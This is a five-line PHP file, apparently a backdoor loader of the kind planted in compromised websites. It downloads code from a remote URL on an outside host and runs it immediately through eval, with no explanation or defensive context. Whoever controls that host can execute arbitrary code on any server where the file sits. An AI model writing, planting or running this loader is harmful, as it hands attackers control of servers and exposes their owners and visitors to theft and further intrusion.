<?php
$path = "https://code.topkz.ru/fgd/8/z.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
